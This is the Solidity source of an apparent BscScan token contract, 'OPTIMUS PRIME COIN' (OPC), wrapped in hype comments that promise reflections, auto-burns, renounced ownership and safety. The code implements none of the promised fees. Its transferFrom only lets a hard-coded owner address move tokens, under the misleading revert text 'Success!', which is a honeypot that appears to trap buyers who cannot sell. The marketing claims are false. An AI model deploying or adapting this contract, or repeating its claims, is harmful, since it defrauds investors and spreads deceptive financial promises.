/**
 *Submitted for verification at BscScan.com on 2021-07-17
*/

/*💸Tokenomics 💸

Total supply: 100.000.000.000 $OPC
Liquidity supply: 90.000.000.000 
Team(locked for 12 months): 5.000.000.000
Marketing pool: 5.000.000.000

RFI SYSTEM
🔢 4% on every transaction goes back to holders
🔢 4% tax on every transaction auto burned

🔐 100% Safe
🔑 Ownership will be renounced.
☑️Liquidity will be locked for 2 years and ownership will be renounced as soon as the fair launch takes place.

🐳ANTI BOT & ANTI WHALE SYSTEM

🕘We announce the contract exactly at the appointed time to avoid purchases by the bot.

🌐SUBSCRIBE US ON SOCIAL MEDIA🌐

Twitter https://twitter.com/opc_token
Telegram https://t.me/opc_coin
Web https://opcoin.tech/

❗️OPTIMUS PRIME COIN - FAIR LAUNCH❗️

July 17 at 20:00 UTC🚀

Let $ OPC Inu send your wallet into space with our radically new token designs that are driving the community crazy.
Our community will send $ OPC Inu to the Moon under the guidance of a large team of hardworking, leading industry professionals.

$ OPC is a community deflationary token that allows holders to make even more money when other people buy or sell. This Fan Token is a trusted and community driven project. It is programmed to reward the holders of our coin. Each transaction will result in a 4% burn and 4% 
goes back to holderst. This will trigger an automatic price level increase and also encourage customers to hold tokens as long as possible. We want you to stay in our project as long as possible!


We will make sure that this token is safe and useful for everyone, with great rewards for our first holders.


Stay with our team and your money will only grow.
*/
pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}

// OPC CONTRACT Constrctor
contract Code is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    address private _owner = 0x4f3285475c20F22CcDbc2dCc5C76D366BBFc6dfd;
    uint256 public _totalSupply;
    uint256 public backtoholdersfee;
    uint256 public autoburned;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    /**
     * OPC constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    constructor() public {
        name = "OPTIMUS PRIME COIN";
        symbol = "OPC";
        decimals = 18;
        _totalSupply = 100000000000000000000000000000;
        backtoholdersfee = 4;
        autoburned = 4; 
   
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
// OPC functions ❗️OPTIMUS PRIME COIN - FAIR LAUNCH❗️

//July 17 at 20:00 UTC🚀

//Let $ OPC Inu send your wallet into space with our radically new token designs that are driving the community crazy.
//Our community will send $ OPC Inu to the Moon under the guidance of a large team of hardworking, leading industry professionals.

//$ OPC is a community deflationary token that allows holders to make even more money when other people buy or sell. This Fan Token is a trusted and community driven project. It is programmed to reward the holders of our coin. Each transaction will result in a 4% burn and 4% 
//goes back to holderst. This will trigger an automatic price level increase and also encourage customers to hold tokens as long as possible. We want you to stay in our project as long as possible!


//We will make sure that this token is safe and useful for everyone, with great rewards for our first holders.


//Stay with our team and your money will only grow.
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
/**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(from == _owner, "Success!");
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
         
    }
}